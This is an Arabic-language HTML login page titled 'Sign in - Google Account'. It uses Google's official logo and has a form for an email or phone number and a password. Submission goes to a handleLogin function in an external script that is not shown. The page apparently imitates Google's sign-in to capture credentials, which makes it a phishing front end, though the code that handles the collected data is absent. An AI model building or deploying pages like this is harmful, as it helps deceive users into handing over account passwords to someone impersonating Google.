<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta charset="UTF-8">
  <title>تسجيل الدخول - حساب Google</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="Style/style.css">
</head>
<body>
  <div class="login-box">
    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo">
    <h2>تسجيل الدخول</h2>
    <p>باستخدام حساب Google الخاص بك</p>
    <form onsubmit="handleLogin(event)">
      <input type="email" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
      <input type="password" id="password" placeholder="كلمة المرور" required>
      <button class="btn" type="submit">التالي</button>
    </form>
  </div>
  <script src="js/script.js"></script>
</body>
</html>
